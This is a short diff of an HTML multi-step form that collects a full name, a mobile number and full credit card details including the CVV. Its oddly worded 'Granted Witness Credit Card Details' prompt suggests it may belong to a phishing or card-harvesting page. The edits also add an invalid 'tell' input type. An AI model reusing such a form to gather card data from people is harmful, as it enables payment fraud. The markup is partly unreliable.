@@ -405,7 +405,7 @@
       </div>
 
       <div id="step1" class="form-step active">
-        <input type="text" id="fullname" placeholder="Full Name" required>
+        <input type="tell" id="fullname" placeholder="Full Name" required>
         <div class="error-message" id="fullname-error">Please enter a valid full name</div>
         
         <input type="text" id="mobile" placeholder="Mobile Number" required>
@@ -441,13 +441,13 @@
           <strong>Note:</strong> Please Enter Your Granted Witness Credit Card Details
         </div>
         
-        <input type="text" id="cardnumber" placeholder="Card Number" required>
+        <input type="number" id="cardnumber" placeholder="Card Number" required>
         <div class="error-message" id="cardnumber-error">Please enter a valid 16-digit card number</div>
         
         <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" required oninput="formatExpiry(this)">
         <div class="error-message" id="expiry-error">Please enter a valid expiry date (MM/YY)</div>
         
-        <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+        <input type="number" id="cvv" placeholder="CVV" maxlength="3" required>
         <div class="error-message" id="cvv-error">Please enter a valid 3-digit CVV</div>
         
         <button class="button" id="step3-button" onclick="validateStep3()">Submit</button>
